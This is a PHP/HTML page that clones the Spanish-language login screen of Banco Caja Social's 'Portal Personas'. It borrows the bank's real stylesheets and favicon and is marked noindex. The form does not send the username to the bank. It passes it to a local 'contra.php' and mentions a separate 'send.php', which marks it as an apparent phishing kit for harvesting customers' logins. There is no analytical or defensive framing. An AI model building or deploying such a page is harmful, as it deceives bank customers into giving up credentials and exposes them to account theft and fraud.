<?php
$sid = '';
// El SID se genera en send.php cuando haga login
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="" lang="es">
<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Inicio de sesión - Portal Personas Banco Caja Social</title>
    <link rel="icon" type="image/x-icon" href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/favicon.ico">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/zocial/zocial.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-theme/dist/backbase-theme.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/styles/identity.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/pficon/pficon.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/tile.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/bcs.7.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/custom-identity.1.css" rel="stylesheet">
    <script src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/scripts/load-background.js"></script>
</head>
<body onload="createBackgrounds();" class="identity-background-1 identity-page--ready">
    <div id="background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
    <div class="bb-stack bb-stack--wrap template-stack-container">
        <div id="inner-background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
        <div class="bb-stack__break bb-stack__break--md-down"></div>
        <div class="bb-stack__item--fill identity-container">
            <div class="identity-container__panel identity-container__panel--animated">
                <div class="identity-container__form">
                    <div class="login-logos-wrapper">
                        <div class="identity-logo bb-block bb-block--lg"></div>
                    </div>
                    <header>
                        <h1 id="kc-page-title">Bienvenido al Portal Personas</h1>
                    </header>
                    <div class="bb-subtitle bb-block bb-block--lg">
                        <span>Ingrese su número de documento o usuario de canales digitales.</span>
                    </div>
                    <div id="kc-form">
                        <div id="kc-form-wrapper">
                            <form id="form-index">
                                <div class="form-group bb-form-field bb-form-field--md">
                                    <label for="username-input" class="label">Usuario</label>
                                    <input id="username-input"
                                        class="form-control"
                                        name="username"
                                        type="text"
                                        autofocus
                                        autocomplete="off"
                                        placeholder="Número de documento o usuario">
                                    <?php if (isset($_GET['error'])): ?>
                                    <small class="bb-input-validation-message" role="alert">
                                        Usuario no encontrado. Intente nuevamente.
                                    </small>
                                    <?php endif; ?>
                                </div>
                                <div class="bb-button-bar bb-block bb-block--xl mt-3">
                                    <button id="btn-index"
                                        class="btn btn-primary w-100"
                                        type="submit"
                                        disabled>
                                        Continuar
                                    </button>
                                </div>
                                <hr class="bb-block bb-block--lg identity-separator">
                                <div class="bb-subtitle d-flex align-items-center gap-2 flex-wrap">
                                    <div class="bb-block bb-block--sm mb-0">¿Es un cliente nuevo?</div>
                                    <strong class="mb-0">
                                        <a class="btn-link-text" href="https://bancapersonas.bancocajasocial.com/web/enrollment">
                                            Registrarse
                                        </a>
                                    </strong>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        const input = document.getElementById('username-input');
        const btn   = document.getElementById('btn-index');

        input.addEventListener('input', () => {
            btn.disabled = input.value.trim().length === 0;
        });

        document.getElementById('form-index').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = input.value.trim();
            if (!username) return;
            // Pasar username a contra.php via GET (se guarda en sesión allá)
            window.location.href = './contra.php?username=' + encodeURIComponent(username);
        });
    </script>
</body>
</html>